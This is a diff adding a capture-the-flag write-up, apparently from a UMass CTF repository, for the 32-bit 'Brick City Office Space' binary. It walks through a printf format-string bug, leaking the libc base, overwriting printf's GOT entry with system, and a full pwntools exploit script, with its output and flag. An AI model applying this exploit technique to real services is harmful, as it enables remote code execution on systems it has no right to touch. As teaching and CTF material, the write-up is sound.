@@ -225,6 +225,314 @@ See the contents of the run for the flag, another solution:
 ----
 # BINARY: Brick City Office Space
 
+Enumerating the context of the binary:
+```bash
+┌──(root㉿kali)-[/home/…/Downloads/Umass-CTF/Binary_Exploit/One]
+└─# file BrickCityOfficeSpace 
+BrickCityOfficeSpace: ELF 32-bit LSB executable, Intel i386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=bbba1b5cfa9ca1c5c04034cdc25f2c9f610d0036, for GNU/Linux 3.2.0, not stripped
+                                                                                                                                            
+┌──(root㉿kali)-[/home/…/Downloads/Umass-CTF/Binary_Exploit/One]
+└─# checksec BrickCityOfficeSpace 
+[*] '/home/kali/Downloads/Umass-CTF/Binary_Exploit/One/BrickCityOfficeSpace'
+    Arch:       i386-32-little
+    RELRO:      No RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x8048000)
+    Stripped:   No
+```
+
+Viewing all of the function names in `objdump`:
+```bash
+┌──(root㉿kali)-[/home/…/Downloads/Umass-CTF/Binary_Exploit/One]
+└─# objdump -d BrickCityOfficeSpace -M intel | grep -E "<.*>:" 
+08049000 <_init>:
+08049030 <__libc_start_main@plt-0x10>:
+08049040 <__libc_start_main@plt>:
+08049050 <printf@plt>:
+08049060 <fgets@plt>:
+08049070 <fwrite@plt>:
+08049080 <puts@plt>:
+08049090 <exit@plt>:
+080490a0 <strlen@plt>:
+080490b0 <setvbuf@plt>:
+080490c0 <_start>:
+08049100 <_dl_relocate_static_pie>:
+08049110 <__x86.get_pc_thunk.bx>:
+08049120 <deregister_tm_clones>:
+08049160 <register_tm_clones>:
+080491a0 <__do_global_dtors_aux>:
+080491d0 <frame_dummy>:
+080491d6 <vuln>:
+080493db <main>:
+08049480 <_fini>:
+```
+
+The decompiled pseudocode of the main function:
+
+<img width="873" height="439" alt="image" src="https://github.com/user-attachments/assets/f56821ae-098b-4b6f-9f55-1fcb9f8b11c8" />
+
+The decompiled pseudocode of the vuln function: 
+
+<img width="869" height="945" alt="image" src="https://github.com/user-attachments/assets/0df41d60-269e-4fc4-967d-3c812fc51813" />
+
+Claude-assisted pseudocode:
+```c
+// Ghidra-decompiled pseudocode of vuln() — slightly cleaned up
+void vuln(void) {
+    char buf[0x250];                    // 592 bytes, at ebp-0x268
+loop:
+    puts(banner_line_1);
+    puts(banner_line_2);
+    puts(banner_line_3);
+    puts(banner_line_4);
+    puts("Now it's your turn to design...");
+    puts("Note: use ` inplace of newlines.");
+    fwrite("BrickCityOfficeSpace> ", 22, 1, stdout);
+
+    fgets(buf, 0x250, stdin);        // reads up to 592 bytes
+
+    for (i = 0; i < strlen(buf); i++) // replace ` with \n
+        if (buf[i] == '`') buf[i] = '\n';
+
+    puts(top_art);
+    printf(buf);                       // <-- FORMAT STRING BUG
+    puts(bottom_art);
+
+    puts("Would you like to redesign? (y/n)");
+    fgets(buf, 0x250, stdin);
+    switch (buf[0]) {
+        case 'y': case 'Y': goto loop;   // keep exploiting
+        case 'n': case 'N': return;        // clean return
+        default: puts(err); printf(buf); exit(0);
+    }
+}
+```
+
+The line `printf(buf)` passes attacker-controlled data as the format string. This is a textbook format string vulnerability.
+
+We're able to read arbitrary stack memory with `%p`, `%x`, and `%s`.
+
+Writing to arbitrary memory with `%n` (number of bytes printed so far).
+
+Combined with the loop (we can answer y and retry), we get multiple format string primitive uses, which is more than enough to leak and write in separate passes. 
+
+##### Finding The Format String Offset
+
+When `printf` is called with our buffer as format string, its numbered arguments (`%1$`, `%2$`, ...) come from the stack above it. Somewhere in that sequence, our own buffer bytes become an "argument". We need to find that position.
+
+```python
+# Technique: send a marker, then %p repeatedly, and see where it appears
+┌──(root㉿kali)-[/home/…/Downloads/Umass-CTF/Binary_Exploit/One]
+└─# python3 -c "print('AAAA.' + '.'.join(f'%{i}\$p' for i in range(1,8)))" > /tmp/fs.txt
+                                                                                                                                            
+┌──(root㉿kali)-[/home/…/Downloads/Umass-CTF/Binary_Exploit/One]
+└─# echo n >> /tmp/fs.txt 
+                                                                                                                                            
+┌──(root㉿kali)-[/home/…/Downloads/Umass-CTF/Binary_Exploit/One]
+└─# ./BrickCityOfficeSpace < /tmp/fs.txt | grep AAAA
+AAAA.0x250.0xf7f575c0.0xf7f57d40.0x41414141.0x2431252e.0x32252e70.0x252e7024
+```
+
+Position	Value	Meaning
+%1$p	0x250	fgets size arg leftover on the stack
+%2$p	0xf7eff5c0	libc pointer (we'll use this!)
+%3$p	0xf7effd40	another libc pointer
+%4$p	0x41414141	our AAAA — offset is 4
+
+What "offset 4" means: if we place a target address as the first 4 bytes of our buffer, then %4$n will write the number of characters printed so far to that address. That's the core primitive for arbitrary writes. 
+
+##### Leaking LibC Base
+
+Positions 2 and 3 are already libc pointers sitting on the stack - almost certainly the libc-internal FILE pointers used by `fgets`. We just need to identify which libc symbol they correspond to so we can subtract to get the base.
+
+```bash
+# Check low 12 bits against libc.so.6 symbols — page-aligned bases mean
+# the low 12 bits of (address - base) must match a symbol's offset.
+from pwn import ELF
+libc = ELF('./libc.so.6')
+leak = 0xf7eff5c0
+for name, off in libc.symbols.items():
+    if (leak - off) & 0xFFF == 0:
+        print(name, hex(leak - off))
+
+# Best match:
+#   _IO_2_1_stdin_  -> libc_base = 0xf7cd0000
+#   _IO_2_1_stdout_ -> libc_base = 0xf7cd0000    (same base — confirms match)
+```
+
+Both leaks resolve to the same base address, which cross-validates our guess. From here:
+```bash
+libc.address          = stdin_leak - libc.symbols['_IO_2_1_stdin_']
+system_addr           = libc.address + libc.symbols['system']      # 0x48170
+bin_sh_addr           = libc.address + next(libc.search(b'/bin/sh\x00'))
+```
+
+##### Global Offset Table (GOT) Overwrite Strategy
+
+We have format-string write primitive (`%n` at offset 4) and we know libc's `system` address. With No RELRO, `printf@got` is writable. The plan:
+```text
+BEFORE                                AFTER
+┌─────────────────┐                 ┌─────────────────┐
+│ printf@plt      │──────jmp────▶  │ printf@plt      │──────jmp────┐
+│ jmp *[printf@got] │                │ jmp *[printf@got] │              │
+└─────────────────┘                 └─────────────────┘              │
+                                                                     ▼
+┌─────────────────┐                 ┌─────────────────┐      ┌──────────┐
+│ printf@got      │                 │ printf@got      │────▶│  system  │
+│ → libc:printf   │                 │ → libc:system   │      │  (libc)  │
+└─────────────────┘                 └─────────────────┘      └──────────┘
+```
+
+After the overwrite, every future call to `printf@plt` in the binary actually jumps to `system` instead. Look at this line in `vuln()`:
+```c
+printf(buf);        // we reach this every loop iteration
+```
+
+With `printf@got == system`, that line is equivalent to `system(buf)` on the next pass. And since `buf` is still under our control from the next `fgets`, we just provide a shell command as our ASCII art
+
+**Why this works on i386:** Both printf and system take their first argument on the stack at [esp+4]. When the compiler emits printf(buf), it pushes buf and does call printf@plt. The PLT trampolines through the GOT, and whatever function we pointed it at sees buf as its first argument. So printf(buf) seamlessly becomes system(buf). 
+
+##### Performing The Write with `fmtstr_payload`
+
+Computing the exact `%n`-write payload by hand is tedious (you have to carefully track the running character count and choose `%hn` vs `%n`, order your writes, etc.). Pwntools can do all of that for us:
+```python
+from pwn import *
+elf  = ELF('./BrickCityOfficeSpace')
+libc = ELF('./libc.so.6')
+libc.address = 0xf7cd0000              # from leak
+
+payload = fmtstr_payload(
+    offset      = 4,                      # where our buffer lives in printf args
+    writes      = {elf.got['printf']: libc.symbols['system']},
+    write_size  = 'short',                # use %hn (2-byte writes)
+)
+print(len(payload))                    # -> 36 bytes, well under 0x250
+```
+
+**Payload length matters:**
+- `fmtstr_payload` can balloon (you need to pad the running count up to specific values using `%Nc`). `write_size='short'` means we do two separate 2-byte writes instead of one 4-byte write, which keeps the maximum padding small. Sanity-check with `assert len(payload) < 0x250`.
+
+**Be aware of the backtick replacement:**
+- Before `printf` is called, the loop in `vuln` replaces every tick (`0x60`) byte with `\n`. Always assert that your payload doesn't contain `0x60`; if it does, re-run with different parameters until you get a clean payload.
+
+##### Popping a shell - loop by loop
+
+**The full attack is three passes through the y → redesign loop:**
+Loop	Payload	Effect
+1 	LEAK:%2$p 	Prints _IO_2_1_stdin_ address; we subtract to get libc base. Answer y.
+2 	fmtstr_payload(4, {got['printf']: system}) 	%n writes system's address over printf@got. Answer y.
+3 	cat flag.txt; ls; id 	printf(buf) is now system(buf) — the command runs, flag is dumped to the socket. 
+
+##### The `interactive()` stalls on the remote
+
+A natural choice for loop 3 is to send `/bin/sh` and call `io.interactive()` and this works perfectly locally. On the remote it silently hangs.
+
+The cause:
+- `system("/bin/sh\n")` calls `execvp("sh", ["sh","-c","/bin/sh\n"])`, which execs a fresh `sh`.
+- That inner shell is attached to the service's socket, not a TTY. Without a TTY, `sh` uses full `stdio` buffering rather than line buffering. Output of commands you type accumulates in a buffer and is only flushed when the shell exits - so it looks dead.
+- Some remotes also have no echo, so you don't even see your own typing.
+
+The fix:
+- Skip the interactive shell and run commands non-interactively in one shot. When `system()` is called with a single command string, it spawns `sh -c "cmd"`, executes the command, waits for completion, and then the whole thing flushes before returning. Output comes back cleanly.
+
+##### Full Exploit Script Ran Locally
+
+**The script:**
+```python
+#!/usr/bin/env python3
+from pwn import *
+
+context.binary = exe = ELF('./BrickCityOfficeSpace')
+context.log_level = 'info'
+libc = ELF('./libc.so.6')
+
+HOST, PORT = 'brick-city-office-space.pwn.ctf.umasscybersec.org', 45001
+
+def start():
+    if args.REMOTE:
+        return remote(HOST, PORT)
+    if args.GDB:
+        return gdb.debug(['./ld-linux.so.2', '--library-path', '.', exe.path],
+                         gdbscript='c')
+    return process(['./ld-linux.so.2', '--library-path', '.', exe.path])
+
+io = start()
+
+# --- Loop 1: leak libc base via stack-resident _IO_2_1_stdin_ pointer ---
+io.recvuntil(b'BrickCityOfficeSpace> ')
+io.sendline(b'LEAK:%2$p')
+io.recvuntil(b'LEAK:')
+stdin_addr = int(io.recvline().strip(), 16)
+libc.address = stdin_addr - libc.symbols['_IO_2_1_stdin_']
+log.success(f'libc base: {hex(libc.address)}')
+
+io.recvuntil(b'redesign? (y/n)')
+io.sendline(b'y')
+
+# --- Loop 2: %n-write printf@got => system ---
+payload = fmtstr_payload(4,
+                          {exe.got['printf']: libc.symbols['system']},
+                          write_size='short')
+assert len(payload) < 0x250
+assert b'`' not in payload
+
+io.recvuntil(b'BrickCityOfficeSpace> ')
+io.sendline(payload)
+io.recvuntil(b'redesign? (y/n)')
+io.sendline(b'y')
+
+# --- Loop 3: printf(buf) -> system(buf), dump the flag ---
+cmd = (b'echo ===FLAG===; cat flag.txt; cat /flag.txt 2>/dev/null; '
+       b'ls -la; id; echo ===END===')
+io.recvuntil(b'BrickCityOfficeSpace> ')
+io.sendline(cmd)
+
+io.recvuntil(b'===FLAG===\n')
+dump = io.recvuntil(b'===END===', drop=True)
+log.success('command output:\n' + dump.decode())
+```
+
+**Output:**
+```bash
+──(root㉿kali)-[/home/…/Downloads/Umass-CTF/Binary_Exploit/One]
+└─# ./exploit2.py 
+[*] '/home/kali/Downloads/Umass-CTF/Binary_Exploit/One/BrickCityOfficeSpace'
+    Arch:       i386-32-little
+    RELRO:      No RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x8048000)
+    Stripped:   No
+[*] '/home/kali/Downloads/Umass-CTF/Binary_Exploit/One/libc.so.6'
+    Arch:       i386-32-little
+    RELRO:      Partial RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+    SHSTK:      Enabled
+    IBT:        Enabled
+[+] Starting local process './ld-linux.so.2': pid 729937
+[+] libc base: 0xf7cee000
+[+] command output:
+    UMASS{example_flag}
+    total 3604
+    drwxr-xr-x 2 root root    4096 Apr 13 21:37 .
+    drwxr-xr-x 4 root root    4096 Apr 11 20:14 ..
+    -rwxrwxrwx 1 root root   14004 Apr 10 17:06 BrickCityOfficeSpace
+    -rw-rw-r-- 1 kali kali 1103686 Apr 11 20:12 brick-city-office-space.zip
+    -rw-r--r-- 1 root root   29333 Apr 11 20:38 brickcity_solve.html
+    -rwxr-xr-x 1 root root    1591 Apr 13 21:37 exploit2.py
+    -rwxr-xr-x 1 root root    5032 Apr 11 20:32 exploit.py
+    -rwxrwxrwx 1 root root      20 Apr 10 17:06 flag.txt
+    -rwxrwxrwx 1 root root  225864 Jan 30 03:20 ld-linux.so.2
+    -rwxrwxrwx 1 root root 2280756 Jan 30 03:20 libc.so.6
+    uid=0(root) gid=0(root) groups=0(root)
+[*] Stopped process './ld-linux.so.2' (pid 729937)
+```
+
+**The flag: UMASS{th3-f0rm4t_15-0ff-th3-ch4rt5}**
+
 ---
 # BINARY: Brick Workshop
 
